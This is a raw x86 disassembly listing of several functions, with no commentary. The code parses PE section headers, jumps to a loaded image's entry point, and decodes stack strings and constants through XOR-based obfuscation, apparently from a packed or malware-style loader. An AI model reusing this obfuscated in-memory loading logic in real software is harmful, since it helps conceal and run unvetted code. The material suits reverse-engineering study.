  426c85:	call   0x4273b5
  426c8a:	mov    eax,DWORD PTR [ebp+0x18]
  426c8d:	mov    ecx,DWORD PTR [ebp-0x24]
  426c90:	mov    edx,DWORD PTR [ebp-0x20]
  426c93:	add    eax,0x28
  426c96:	xor    ecx,esi
  426c98:	lea    ecx,[edx+ecx*1+0x3272e0]
  426c9f:	mov    edx,DWORD PTR [ebp+0xc]
  426ca2:	mov    DWORD PTR [ebp+0x18],eax
  426ca5:	mov    eax,DWORD PTR [ebp-0x24]
  426ca8:	movzx  edx,WORD PTR [edx+0x6]
  426cac:	xor    eax,esi
  426cae:	sub    edx,eax
  426cb0:	mov    eax,DWORD PTR [ebp+0xc]
  426cb3:	sub    edx,ebx
  426cb5:	mov    DWORD PTR [ebp-0x20],ecx
  426cb8:	cmp    ecx,edx
  426cba:	jbe    0x426c3f
  426cbc:	mov    ecx,DWORD PTR [ebp-0x4]
  426cbf:	mov    edx,DWORD PTR [edi+0x18c]
  426cc5:	xor    ecx,esi
  426cc7:	add    ecx,ebx
  426cc9:	mov    DWORD PTR [ebp+0x18],ecx
  426ccc:	mov    ecx,DWORD PTR [ebp+0x20]
  426ccf:	cmp    ecx,DWORD PTR [edx]
  426cd1:	jne    0x426cfa
  426cd3:	mov    eax,DWORD PTR [edi+0x1d8]
  426cd9:	lea    edx,[ebp-0x18]
  426cdc:	push   edx
  426cdd:	mov    edx,DWORD PTR [ebp-0xc]
  426ce0:	xor    edx,esi
  426ce2:	add    edx,ebx
  426ce4:	push   edx
  426ce5:	mov    edx,DWORD PTR [ebp-0x1c]
  426ce8:	push   DWORD PTR [edx+0x54]
  426ceb:	push   ecx
  426cec:	call   DWORD PTR [eax+0x1c]
  426cef:	test   eax,eax
  426cf1:	je     0x426eeb
  426cf7:	mov    eax,DWORD PTR [ebp+0xc]
  426cfa:	mov    ecx,DWORD PTR [edi+0x1c8]
  426d00:	mov    ecx,DWORD PTR [ecx]
  426d02:	xor    ecx,esi
  426d04:	add    ecx,ebx
  426d06:	je     0x426e16
  426d0c:	and    DWORD PTR [ebp-0x28],0x0
  426d10:	mov    eax,0x4f92
  426d15:	mov    WORD PTR [ebp-0x3c],ax
  426d19:	add    eax,0x16
  426d1c:	mov    WORD PTR [ebp-0x3a],ax
  426d20:	mov    eax,0x4f98
  426d25:	mov    WORD PTR [ebp-0x38],ax
  426d29:	add    eax,0xfffffff8
  426d2c:	and    DWORD PTR [ebp+0x8],0x0
  426d30:	mov    ecx,eax
  426d32:	mov    WORD PTR [ebp-0x34],ax
  426d36:	mov    eax,0x4e3c
  426d3b:	mov    WORD PTR [ebp-0x36],cx
  426d3f:	mov    WORD PTR [ebp-0x32],ax
  426d43:	mov    eax,DWORD PTR [ebp+0x8]
  426d46:	lea    eax,[ebp+eax*2-0x3c]
  426d4a:	mov    ecx,0x8a8c
  426d4f:	xor    cx,WORD PTR [eax]
  426d52:	mov    edx,0x3b50
  426d57:	add    cx,dx
  426d5a:	inc    DWORD PTR [ebp+0x8]
  426d5d:	cmp    DWORD PTR [ebp+0x8],0x6
  426d61:	mov    WORD PTR [eax],cx
  426d64:	jb     0x426d43
  426d66:	mov    DWORD PTR [ebp-0x54],0x3c081e26
  426d6d:	mov    DWORD PTR [ebp-0x50],0x3d1e0401
  426d74:	mov    DWORD PTR [ebp-0x4c],0xf1080e04
  426d7b:	mov    DWORD PTR [ebp-0x48],0x39080b3c
  426d82:	mov    DWORD PTR [ebp-0x44],0x1d081e1e
  426d89:	mov    WORD PTR [ebp-0x40],0xf0f
  426d8f:	mov    BYTE PTR [ebp-0x3e],0x7a
  426d93:	xor    ecx,ecx
  426d95:	lea    eax,[ebp+ecx*1-0x54]
  426d99:	mov    dl,BYTE PTR [eax]
  426d9b:	xor    dl,0x73
  426d9e:	sub    dl,0x9
  426da1:	inc    ecx
  426da2:	mov    BYTE PTR [eax],dl
  426da4:	cmp    ecx,0x17
  426da7:	jb     0x426d95
  426da9:	mov    eax,DWORD PTR [edi+0x1d8]
  426daf:	lea    ecx,[ebp-0x3c]
  426db2:	push   ecx
  426db3:	call   DWORD PTR [eax+0x4]
  426db6:	mov    ecx,DWORD PTR [edi+0x1d8]
  426dbc:	lea    edx,[ebp-0x54]
  426dbf:	push   edx
  426dc0:	push   eax
  426dc1:	call   DWORD PTR [ecx+0x8]
  426dc4:	lea    ecx,[ebp-0x28]
  426dc7:	push   ecx
  426dc8:	mov    ecx,DWORD PTR [edi+0x18c]
  426dce:	push   DWORD PTR [ecx]
  426dd0:	call   eax
  426dd2:	mov    eax,DWORD PTR [ebp-0x28]
  426dd5:	test   eax,eax
  426dd7:	je     0x426e13
  426dd9:	mov    DWORD PTR [ebp+0x8],eax
  426ddc:	jmp    0x426de8
  426dde:	mov    eax,DWORD PTR [eax]
  426de0:	mov    DWORD PTR [ebp-0x28],eax
  426de3:	cmp    eax,DWORD PTR [ebp+0x8]
  426de6:	je     0x426df5
  426de8:	mov    edx,DWORD PTR [eax+0x18]
  426deb:	mov    ecx,DWORD PTR [edi+0x18c]
  426df1:	cmp    edx,DWORD PTR [ecx]
  426df3:	jne    0x426dde
  426df5:	mov    edx,DWORD PTR [eax+0x18]
  426df8:	mov    ecx,DWORD PTR [edi+0x18c]
  426dfe:	cmp    edx,DWORD PTR [ecx]
  426e00:	jne    0x426e13
  426e02:	mov    edx,DWORD PTR [ebp-0x1c]
  426e05:	mov    ecx,DWORD PTR [edi+0x190]
  426e0b:	mov    edx,DWORD PTR [edx+0x28]
  426e0e:	add    edx,DWORD PTR [ecx]
  426e10:	mov    DWORD PTR [eax+0x1c],edx
  426e13:	mov    eax,DWORD PTR [ebp+0xc]
  426e16:	push   edi
  426e17:	push   eax
  426e18:	push   DWORD PTR [ebp+0x20]
  426e1b:	call   0x42663e
  426e20:	test   eax,eax
  426e22:	je     0x426eeb
  426e28:	push   DWORD PTR [ebp+0xc]
  426e2b:	mov    ecx,edi
  426e2d:	push   DWORD PTR [ebp+0x20]
  426e30:	call   0x426597
  426e35:	test   eax,eax
  426e37:	je     0x426eeb
  426e3d:	mov    eax,DWORD PTR [ebp+0xc]
  426e40:	mov    edx,DWORD PTR [ebp+0x20]
  426e43:	mov    ecx,edi
  426e45:	call   0x426470
  426e4a:	test   eax,eax
  426e4c:	je     0x426eeb
  426e52:	push   edi
  426e53:	push   DWORD PTR [ebp+0x20]
  426e56:	call   0x426921
  426e5b:	test   eax,eax
  426e5d:	je     0x426eeb
  426e63:	mov    eax,DWORD PTR [edi+0x18c]
  426e69:	mov    edx,DWORD PTR [ebp+0x20]
  426e6c:	cmp    edx,DWORD PTR [eax]
  426e6e:	jne    0x426e8a
  426e70:	mov    eax,DWORD PTR [edi+0x1d8]
  426e76:	lea    ecx,[ebp-0x18]
  426e79:	push   ecx
  426e7a:	push   DWORD PTR [ebp-0x18]
  426e7d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426e80:	push   DWORD PTR [ecx+0x54]
  426e83:	push   edx
  426e84:	call   DWORD PTR [eax+0x1c]
  426e87:	mov    edx,DWORD PTR [ebp+0x20]
  426e8a:	mov    eax,DWORD PTR [edi+0x1c8]
  426e90:	mov    eax,DWORD PTR [eax]
  426e92:	xor    eax,esi
  426e94:	add    eax,ebx
  426e96:	je     0x426ecf
  426e98:	mov    ecx,DWORD PTR [ebp+0xc]
  426e9b:	mov    eax,DWORD PTR [ecx+0x28]
  426e9e:	mov    DWORD PTR [ebp+0x8],0xf89ca5b9
  426ea5:	mov    esi,DWORD PTR [ebp+0x8]
  426ea8:	push   DWORD PTR [ebp+0x14]
  426eab:	xor    esi,0x899
  426eb1:	push   DWORD PTR [ebp+0x10]
  426eb4:	add    esi,0x72e0
  426eba:	or     WORD PTR [ecx+0x16],si
  426ebe:	add    eax,edx
  426ec0:	push   edx
  426ec1:	call   eax
  426ec3:	mov    DWORD PTR [edi+0x1d0],0xf89c85b8
  426ecd:	jmp    0x426ed9
  426ecf:	mov    eax,DWORD PTR [ebp+0xc]
  426ed2:	mov    eax,DWORD PTR [eax+0x28]
  426ed5:	add    eax,edx
  426ed7:	call   eax
  426ed9:	mov    DWORD PTR [ebp-0x20],eax
  426edc:	mov    eax,DWORD PTR [ebp-0x20]
  426edf:	mov    ecx,DWORD PTR [ebp+0x1c]
  426ee2:	mov    DWORD PTR [ecx],eax
  426ee4:	mov    DWORD PTR [ebp+0x18],0x1
  426eeb:	cmp    DWORD PTR [ebp+0x18],0x0
  426eef:	jne    0x426ef5
  426ef1:	and    DWORD PTR [ebp+0x20],0x0
  426ef5:	mov    eax,DWORD PTR [ebp+0x20]
  426ef8:	jmp    0x426efc
  426efa:	xor    eax,eax
  426efc:	pop    edi
  426efd:	pop    esi
  426efe:	pop    ebx
  426eff:	leave  
  426f00:	ret    0x1c
  426f03:	push   ebp
  426f04:	mov    ebp,esp
  426f06:	movzx  edx,WORD PTR [ecx+0x6]
  426f0a:	movzx  eax,WORD PTR [ecx+0x14]
  426f0e:	push   ebx
  426f0f:	push   edi
  426f10:	xor    edi,edi
  426f12:	lea    eax,[eax+ecx*1+0x18]
  426f16:	test   edx,edx
  426f18:	je     0x426f39
  426f1a:	mov    ecx,DWORD PTR [eax+0xc]
  426f1d:	lea    ebx,[ecx+esi*1]
  426f20:	cmp    DWORD PTR [ebp+0x8],ebx
  426f23:	jb     0x426f31
  426f25:	mov    ebx,DWORD PTR [eax+0x8]
  426f28:	add    ebx,ecx
  426f2a:	add    ebx,esi
  426f2c:	cmp    DWORD PTR [ebp+0x8],ebx
  426f2f:	jb     0x426f3b
  426f31:	add    eax,0x28
  426f34:	inc    edi
  426f35:	cmp    edi,edx
  426f37:	jb     0x426f1a
  426f39:	xor    eax,eax
  426f3b:	pop    edi
  426f3c:	pop    ebx
  426f3d:	pop    ebp
  426f3e:	ret    0x4
  426f41:	push   ebp
  426f42:	mov    ebp,esp
  426f44:	sub    esp,0x28
  426f47:	mov    DWORD PTR [ebp-0x10],0xf89c85b9
  426f4e:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  426f55:	mov    DWORD PTR [ebp-0x28],0xf89c85bb
  426f5c:	mov    eax,0x4f9d
  426f61:	mov    WORD PTR [ebp-0xc],ax
  426f65:	mov    eax,0x4e7d
  426f6a:	mov    WORD PTR [ebp-0x4],ax
  426f6e:	mov    eax,0x4fa6
  426f73:	mov    WORD PTR [ebp-0x8],ax
  426f77:	add    eax,0xffffffe0
  426f7a:	mov    WORD PTR [ebp-0x8],ax
  426f7e:	mov    eax,DWORD PTR [ebp+0x8]
  426f81:	mov    DWORD PTR [ebp-0x14],eax
  426f84:	mov    eax,DWORD PTR [ebp+0xc]
  426f87:	mov    DWORD PTR [ebp-0x18],eax
  426f8a:	mov    eax,DWORD PTR [ebp-0x10]
  426f8d:	push   ebx
  426f8e:	mov    ecx,0x7510899
  426f93:	xor    eax,ecx
  426f95:	push   esi
  426f96:	mov    esi,DWORD PTR [ebp-0x14]
  426f99:	mov    edx,0x3272e0
  426f9e:	add    eax,edx
  426fa0:	push   edi
  426fa1:	cmp    esi,eax
  426fa3:	je     0x4271a1
  426fa9:	mov    eax,DWORD PTR [ebp-0x10]
  426fac:	mov    esi,DWORD PTR [ebp-0x18]
  426faf:	xor    eax,ecx
  426fb1:	add    eax,edx
  426fb3:	cmp    esi,eax
  426fb5:	je     0x4271a1
  426fbb:	mov    eax,DWORD PTR [ebp-0x10]
  426fbe:	xor    eax,ecx
  426fc0:	add    eax,edx
  426fc2:	mov    DWORD PTR [ebp-0x20],eax
  426fc5:	mov    eax,DWORD PTR [ebp-0x10]
  426fc8:	xor    eax,ecx
  426fca:	add    eax,edx
  426fcc:	mov    DWORD PTR [ebp-0x24],eax
  426fcf:	movzx  esi,WORD PTR [ebp-0x4]
  426fd3:	movzx  edi,WORD PTR [ebp-0xc]
  426fd7:	mov    eax,0x8a8c
  426fdc:	xor    si,ax
  426fdf:	mov    ebx,0x8a8c
  426fe4:	xor    di,bx
  426fe7:	mov    eax,0x3b50
  426fec:	add    si,ax
  426fef:	add    di,ax
  426ff2:	sub    edi,esi
  426ff4:	mov    WORD PTR [ebp-0xc],di
  426ff8:	mov    esi,DWORD PTR [ebp-0x20]
  426ffb:	mov    edi,DWORD PTR [ebp-0x14]
  426ffe:	mov    si,WORD PTR [edi+esi*2]
  427002:	mov    WORD PTR [ebp+0x8],si
  427006:	mov    esi,DWORD PTR [ebp-0x24]
  427009:	mov    edi,DWORD PTR [ebp-0x18]
  42700c:	mov    si,WORD PTR [edi+esi*2]
  427010:	mov    WORD PTR [ebp+0xc],si
  427014:	mov    esi,0x72e0
  427019:	jmp    0x427126
  42701e:	mov    edi,DWORD PTR [ebp-0x10]
  427021:	mov    bx,WORD PTR [ebp+0xc]
  427025:	xor    edi,0x899
  42702b:	add    edi,esi
  42702d:	cmp    bx,di
  427030:	je     0x427150
  427036:	mov    edi,DWORD PTR [ebp-0x10]
  427039:	mov    ebx,DWORD PTR [ebp+0x10]
  42703c:	xor    edi,ecx
  42703e:	add    edi,edx
  427040:	cmp    ebx,edi
  427042:	mov    di,WORD PTR [ebp+0xc]
  427046:	mov    bx,WORD PTR [ebp+0x8]
  42704a:	je     0x4270dd
  427050:	cmp    bx,di
  427053:	je     0x4270e6
  427059:	mov    di,WORD PTR [ebp-0x4]
  42705d:	mov    ebx,0x8a8c
  427062:	xor    di,bx
  427065:	mov    bx,WORD PTR [ebp+0x8]
  427069:	add    di,ax
  42706c:	cmp    bx,di
  42706f:	jb     0x427097
  427071:	mov    di,WORD PTR [ebp-0x8]
  427075:	mov    ebx,0x8a8c
  42707a:	xor    di,bx
  42707d:	mov    bx,WORD PTR [ebp+0x8]
  427081:	add    di,ax
  427084:	cmp    bx,di
  427087:	ja     0x427097
  427089:	movzx  edi,WORD PTR [ebp+0x8]
  42708d:	movzx  ebx,WORD PTR [ebp-0xc]
  427091:	add    edi,ebx
  427093:	mov    WORD PTR [ebp+0x8],di
  427097:	mov    di,WORD PTR [ebp-0x4]
  42709b:	mov    ebx,0x8a8c
  4270a0:	xor    di,bx
  4270a3:	mov    bx,WORD PTR [ebp+0xc]
  4270a7:	add    di,ax
  4270aa:	cmp    bx,di
  4270ad:	jb     0x4270d5
  4270af:	mov    di,WORD PTR [ebp-0x8]
  4270b3:	mov    ebx,0x8a8c
  4270b8:	xor    di,bx
  4270bb:	mov    bx,WORD PTR [ebp+0xc]
  4270bf:	add    di,ax
  4270c2:	cmp    bx,di
  4270c5:	ja     0x4270d5
  4270c7:	movzx  edi,WORD PTR [ebp+0xc]
  4270cb:	movzx  ebx,WORD PTR [ebp-0xc]
  4270cf:	add    edi,ebx
  4270d1:	mov    WORD PTR [ebp+0xc],di
  4270d5:	mov    di,WORD PTR [ebp+0xc]
  4270d9:	mov    bx,WORD PTR [ebp+0x8]
  4270dd:	cmp    bx,di
  4270e0:	jne    0x4271a1
  4270e6:	mov    edi,DWORD PTR [ebp-0x28]
  4270e9:	mov    ebx,DWORD PTR [ebp-0x14]
  4270ec:	xor    edi,ecx
  4270ee:	lea    edi,[edi+ebx*1+0x3272e0]
  4270f5:	mov    DWORD PTR [ebp-0x14],edi
  4270f8:	mov    edi,DWORD PTR [ebp-0x28]
  4270fb:	mov    ebx,DWORD PTR [ebp-0x18]
  4270fe:	xor    edi,ecx
  427100:	lea    edi,[edi+ebx*1+0x3272e0]
  427107:	mov    DWORD PTR [ebp-0x18],edi
  42710a:	mov    edi,DWORD PTR [ebp-0x20]
  42710d:	mov    ebx,DWORD PTR [ebp-0x14]
  427110:	mov    di,WORD PTR [ebx+edi*2]
  427114:	mov    WORD PTR [ebp+0x8],di
  427118:	mov    edi,DWORD PTR [ebp-0x24]
  42711b:	mov    ebx,DWORD PTR [ebp-0x18]
  42711e:	mov    di,WORD PTR [ebx+edi*2]
  427122:	mov    WORD PTR [ebp+0xc],di
  427126:	mov    edi,DWORD PTR [ebp-0x10]
  427129:	mov    bx,WORD PTR [ebp+0x8]
  42712d:	xor    edi,0x899
  427133:	add    edi,esi
  427135:	cmp    bx,di
  427138:	jne    0x42701e
  42713e:	mov    esi,DWORD PTR [ebp-0x1c]
  427141:	xor    esi,ecx
  427143:	mov    ecx,DWORD PTR [ebp-0x10]
  427146:	add    esi,edx
  427148:	imul   esi,ecx
  42714b:	mov    DWORD PTR [ebp-0x10],esi
  42714e:	jmp    0x427162
  427150:	mov    edx,DWORD PTR [ebp-0x10]
  427153:	xor    edx,ecx
  427155:	mov    ecx,DWORD PTR [ebp-0x1c]
  427158:	lea    ecx,[edx+ecx*1+0x3272e0]
  42715f:	mov    DWORD PTR [ebp-0x1c],ecx
  427162:	mov    edx,DWORD PTR [ebp-0x20]
  427165:	mov    esi,DWORD PTR [ebp-0x14]
  427168:	mov    si,WORD PTR [esi+edx*2]
  42716c:	mov    ecx,eax
  42716e:	sub    si,cx
  427171:	mov    edx,0x8a8c
  427176:	xor    si,dx
  427179:	mov    ecx,0x4e3c
  42717e:	cmp    si,cx
  427181:	jne    0x42719c
  427183:	mov    esi,DWORD PTR [ebp-0x24]
  427186:	mov    edi,DWORD PTR [ebp-0x18]
  427189:	mov    si,WORD PTR [edi+esi*2]
  42718d:	sub    si,ax
  427190:	xor    si,dx
  427193:	cmp    si,cx
  427196:	jne    0x42719c
  427198:	xor    eax,eax
  42719a:	jmp    0x4271a8
  42719c:	xor    eax,eax
  42719e:	inc    eax
  42719f:	jmp    0x4271a8
  4271a1:	mov    eax,DWORD PTR [ebp-0x1c]
  4271a4:	xor    eax,ecx
  4271a6:	add    eax,edx
  4271a8:	pop    edi
  4271a9:	pop    esi
  4271aa:	pop    ebx
  4271ab:	leave  
  4271ac:	ret    0xc
  4271af:	push   ebp
  4271b0:	mov    ebp,esp
  4271b2:	push   ecx
  4271b3:	mov    cx,WORD PTR [eax]
  4271b6:	push   esi
  4271b7:	mov    esi,0x3b50
  4271bc:	sub    cx,si
  4271bf:	mov    esi,0x8a8c
  4271c4:	xor    cx,si
  4271c7:	mov    esi,0x4e3c
  4271cc:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  4271d3:	mov    edx,0xf89c85b9
  4271d8:	cmp    cx,si
  4271db:	je     0x42723a
  4271dd:	push   ebx
  4271de:	push   edi
  4271df:	movzx  ecx,cx
  4271e2:	mov    edi,0xffcd8d20
  4271e7:	mov    esi,0x7510899
  4271ec:	mov    ebx,0x4f80
  4271f1:	cmp    cx,bx
  4271f4:	jne    0x4271f9
  4271f6:	mov    DWORD PTR [ebp-0x4],edx
  4271f9:	lea    edx,[edi+0x1]
  4271fc:	xor    edx,esi
  4271fe:	mov    edi,edx
  427200:	xor    edi,esi
  427202:	mov    cx,WORD PTR [eax+edi*2+0x64e5c0]
  42720a:	mov    ebx,0x3b50
  42720f:	sub    cx,bx
  427212:	mov    ebx,0x8a8c
  427217:	xor    cx,bx
  42721a:	mov    ebx,0x4e3c
  42721f:	cmp    cx,bx
  427222:	jne    0x4271ec
  427224:	mov    ecx,DWORD PTR [ebp-0x4]
  427227:	pop    edi
  427228:	pop    ebx
  427229:	cmp    ecx,0xf89c8586
  42722f:	je     0x42723a
  427231:	xor    ecx,esi
  427233:	lea    eax,[eax+ecx*2+0x64e5c2]
  42723a:	pop    esi
  42723b:	leave  
  42723c:	ret    
  42723d:	push   ebp
  42723e:	mov    ebp,esp
  427240:	push   ecx
  427241:	push   esi
  427242:	push   edi
  427243:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  42724a:	mov    esi,0xf89c85b9
  42724f:	call   0x4271af
  427254:	mov    edi,eax
  427256:	mov    al,BYTE PTR [edi]
  427258:	add    al,0x9
  42725a:	xor    al,0x73
  42725c:	cmp    al,0x7a
  42725e:	je     0x4272c1
  427260:	mov    eax,edi
  427262:	mov    edx,0xffcd8d20
  427267:	mov    ecx,0x7510899
  42726c:	push   ebx
  42726d:	mov    ax,WORD PTR [eax]
  427270:	mov    ebx,0x3b50
  427275:	sub    ax,bx
  427278:	mov    ebx,0x8a8c
  42727d:	xor    ax,bx
  427280:	mov    ebx,0x4e52
  427285:	cmp    ax,bx
  427288:	jne    0x42728d
  42728a:	mov    DWORD PTR [ebp-0x4],esi
  42728d:	lea    esi,[edx+0x1]
  427290:	xor    esi,ecx
  427292:	mov    edx,esi
  427294:	xor    edx,ecx
  427296:	lea    eax,[edi+edx*2+0x64e5c0]
  42729d:	mov    bl,BYTE PTR [eax]
  42729f:	add    bl,0x9
  4272a2:	xor    bl,0x73
  4272a5:	cmp    bl,0x7a
  4272a8:	jne    0x42726d
  4272aa:	mov    eax,DWORD PTR [ebp-0x4]
  4272ad:	pop    ebx
  4272ae:	cmp    eax,0xf89c8586
  4272b3:	je     0x4272c1
  4272b5:	xor    eax,ecx
  4272b7:	xor    ecx,ecx
  4272b9:	mov    WORD PTR [edi+eax*2+0x64e5c0],cx
  4272c1:	mov    eax,edi
  4272c3:	pop    edi
  4272c4:	pop    esi
  4272c5:	leave  
  4272c6:	ret    
  4272c7:	push   ebp
  4272c8:	mov    ebp,esp
  4272ca:	push   ecx
  4272cb:	push   esi
  4272cc:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  4272d3:	mov    esi,0xf89c85b9
  4272d8:	call   0x4271af
  4272dd:	mov    cx,WORD PTR [eax]
  4272e0:	mov    edx,0x3b50
  4272e5:	sub    cx,dx
  4272e8:	mov    edx,0x8a8c
  4272ed:	xor    cx,dx
  4272f0:	mov    edx,0x4e3c
  4272f5:	cmp    cx,dx
  4272f8:	je     0x427351
  4272fa:	push   ebx
  4272fb:	push   edi
  4272fc:	movzx  ecx,cx
  4272ff:	mov    edx,0xffcd8d20
  427304:	mov    edi,0x7510899
  427309:	mov    ebx,0x4e52
  42730e:	cmp    cx,bx
  427311:	jne    0x427316
  427313:	mov    DWORD PTR [ebp-0x4],esi
  427316:	lea    esi,[edx+0x1]
  427319:	xor    esi,edi
  42731b:	mov    edx,esi
  42731d:	xor    edx,edi
  42731f:	mov    cx,WORD PTR [eax+edx*2+0x64e5c0]
  427327:	mov    ebx,0x3b50
  42732c:	sub    cx,bx
  42732f:	mov    ebx,0x8a8c
  427334:	xor    cx,bx
  427337:	mov    ebx,0x4e3c
  42733c:	cmp    cx,bx
  42733f:	jne    0x427309
  427341:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  427348:	pop    edi
  427349:	pop    ebx
  42734a:	je     0x427351
  42734c:	xor    eax,eax
  42734e:	inc    eax
  42734f:	jmp    0x427353
  427351:	xor    eax,eax
  427353:	pop    esi
  427354:	leave  
  427355:	ret    
  427356:	push   ebp
  427357:	mov    ebp,esp
  427359:	push   ecx
  42735a:	mov    eax,DWORD PTR [ebp+0x8]
  42735d:	movzx  ecx,WORD PTR [eax]
  427360:	push   esi
  427361:	lea    eax,[ecx-0x3b50]
  427367:	mov    esi,0x8a8c
  42736c:	push   edi
  42736d:	xor    eax,esi
  42736f:	mov    edi,0x4e3c
  427374:	mov    DWORD PTR [ebp-0x4],edx
  427377:	cmp    ax,di
  42737a:	je     0x4273a7
  42737c:	mov    eax,DWORD PTR [ebp+0x8]
  42737f:	sub    eax,edx
  427381:	mov    DWORD PTR [ebp+0x8],eax
  427384:	jmp    0x427389
  427386:	mov    eax,DWORD PTR [ebp+0x8]
  427389:	mov    WORD PTR [edx],cx
  42738c:	add    edx,0x2
  42738f:	movzx  edi,WORD PTR [eax+edx*1]
  427393:	mov    ecx,edi
  427395:	add    edi,0xffffc4b0
  42739b:	xor    edi,esi
  42739d:	mov    eax,0x4e3c
  4273a2:	cmp    di,ax
  4273a5:	jne    0x427386
  4273a7:	xor    eax,eax
  4273a9:	pop    edi
  4273aa:	mov    WORD PTR [edx],ax
  4273ad:	mov    eax,DWORD PTR [ebp-0x4]
  4273b0:	pop    esi
  4273b1:	leave  
  4273b2:	ret    0x4
  4273b5:	push   ebp
  4273b6:	mov    ebp,esp
  4273b8:	sub    esp,0x18
  4273bb:	mov    DWORD PTR [ebp-0x14],0xf89c85b9
  4273c2:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4273c9:	mov    eax,DWORD PTR [ebp-0x14]
  4273cc:	xor    eax,0x7510899
  4273d1:	add    eax,0x3272e0
  4273d6:	mov    DWORD PTR [ebp-0x8],eax
  4273d9:	mov    DWORD PTR [ebp-0x10],0xf89c85b1
  4273e0:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4273e7:	mov    DWORD PTR [ebp-0x4],0xf89c85bb
  4273ee:	mov    eax,DWORD PTR [ebp-0x14]
  4273f1:	xor    eax,0x7510899
  4273f6:	mov    ecx,DWORD PTR [ebp-0x8]
  4273f9:	lea    eax,[ecx+eax*1+0x3272e0]
  427400:	mov    ecx,DWORD PTR [ebp-0x18]
  427403:	xor    ecx,0x7510899
  427409:	add    ecx,0x3272e0
  42740f:	mov    edx,DWORD PTR [ebp+0x10]
  427412:	imul   edx,ecx
  427415:	cmp    eax,edx
  427417:	jae    0x42750a
  42741d:	mov    eax,DWORD PTR [ebp+0x10]
  427420:	mov    ecx,DWORD PTR [ebp-0x8]
  427423:	sub    eax,ecx
  427425:	mov    ecx,DWORD PTR [ebp-0x10]
  427428:	xor    ecx,0x7510899
  42742e:	add    ecx,0x3272e0
  427434:	cmp    eax,ecx
  427436:	jbe    0x427468
  427438:	mov    eax,DWORD PTR [ebp+0x8]
  42743b:	add    eax,DWORD PTR [ebp-0x8]
  42743e:	mov    ecx,DWORD PTR [ebp+0xc]
  427441:	add    ecx,DWORD PTR [ebp-0x8]
  427444:	mov    edx,DWORD PTR [ecx]
  427446:	mov    DWORD PTR [eax],edx
  427448:	mov    ecx,DWORD PTR [ecx+0x4]
  42744b:	mov    DWORD PTR [eax+0x4],ecx
  42744e:	mov    eax,DWORD PTR [ebp-0x10]
  427451:	xor    eax,0x7510899
  427456:	mov    ecx,DWORD PTR [ebp-0x8]
  427459:	lea    eax,[ecx+eax*1+0x3272e0]
  427460:	mov    DWORD PTR [ebp-0x8],eax
  427463:	jmp    0x427505
  427468:	mov    eax,DWORD PTR [ebp+0x10]
  42746b:	mov    ecx,DWORD PTR [ebp-0x8]
  42746e:	sub    eax,ecx
  427470:	mov    ecx,DWORD PTR [ebp-0xc]
  427473:	xor    ecx,0x7510899
  427479:	add    ecx,0x3272e0
  42747f:	cmp    eax,ecx
  427481:	jbe    0x4274aa
  427483:	mov    eax,DWORD PTR [ebp+0x8]
  427486:	add    eax,DWORD PTR [ebp-0x8]
  427489:	mov    ecx,DWORD PTR [ebp+0xc]
  42748c:	add    ecx,DWORD PTR [ebp-0x8]
  42748f:	mov    ecx,DWORD PTR [ecx]
  427491:	mov    DWORD PTR [eax],ecx
  427493:	mov    eax,DWORD PTR [ebp-0xc]
  427496:	xor    eax,0x7510899
  42749b:	mov    ecx,DWORD PTR [ebp-0x8]
  42749e:	lea    eax,[ecx+eax*1+0x3272e0]
  4274a5:	mov    DWORD PTR [ebp-0x8],eax
  4274a8:	jmp    0x427505
  4274aa:	mov    eax,DWORD PTR [ebp+0x10]
  4274ad:	mov    ecx,DWORD PTR [ebp-0x8]
  4274b0:	sub    eax,ecx
  4274b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4274b5:	xor    ecx,0x7510899
  4274bb:	add    ecx,0x3272e0
  4274c1:	cmp    eax,ecx
  4274c3:	jbe    0x4274ee
  4274c5:	mov    eax,DWORD PTR [ebp+0x8]
  4274c8:	add    eax,DWORD PTR [ebp-0x8]
  4274cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4274ce:	add    ecx,DWORD PTR [ebp-0x8]
  4274d1:	mov    cx,WORD PTR [ecx]
  4274d4:	mov    WORD PTR [eax],cx
  4274d7:	mov    eax,DWORD PTR [ebp-0x4]
  4274da:	xor    eax,0x7510899
  4274df:	mov    ecx,DWORD PTR [ebp-0x8]
  4274e2:	lea    eax,[ecx+eax*1+0x3272e0]
  4274e9:	mov    DWORD PTR [ebp-0x8],eax
  4274ec:	jmp    0x427505
  4274ee:	mov    eax,DWORD PTR [ebp+0x8]
  4274f1:	add    eax,DWORD PTR [ebp-0x8]
  4274f4:	mov    ecx,DWORD PTR [ebp+0xc]
  4274f7:	add    ecx,DWORD PTR [ebp-0x8]
  4274fa:	mov    cl,BYTE PTR [ecx]
  4274fc:	mov    BYTE PTR [eax],cl
  4274fe:	mov    eax,DWORD PTR [ebp-0x8]
  427501:	inc    eax
  427502:	mov    DWORD PTR [ebp-0x8],eax
  427505:	jmp    0x4273ee
  42750a:	leave  
  42750b:	ret    0xc
  42750e:	push   ebp
  42750f:	mov    ebp,esp
  427511:	push   ecx
  427512:	push   ecx
  427513:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  42751a:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  427521:	xor    eax,eax
  427523:	inc    eax
  427524:	je     0x427566
  427526:	mov    eax,DWORD PTR [ebp-0x4]
  427529:	xor    eax,0x7510899
  42752e:	add    eax,0x3272e0
  427533:	cmp    DWORD PTR [ebp+0xc],eax
  427536:	jne    0x42753a
  427538:	jmp    0x427566
  42753a:	mov    eax,DWORD PTR [ebp-0x8]
  42753d:	xor    eax,0x7510899
  427542:	add    eax,0x3272e0
  427547:	mov    ecx,DWORD PTR [ebp+0xc]
  42754a:	sub    ecx,eax
  42754c:	mov    DWORD PTR [ebp+0xc],ecx
  42754f:	mov    eax,DWORD PTR [ebp-0x4]
  427552:	xor    eax,0x7510899
  427557:	add    eax,0x3272e0
  42755c:	mov    ecx,DWORD PTR [ebp+0x8]
  42755f:	add    ecx,DWORD PTR [ebp+0xc]
  427562:	mov    BYTE PTR [ecx],al
  427564:	jmp    0x427521
  427566:	leave  
  427567:	ret    0x8
  42756a:	push   ebp
  42756b:	mov    ebp,esp
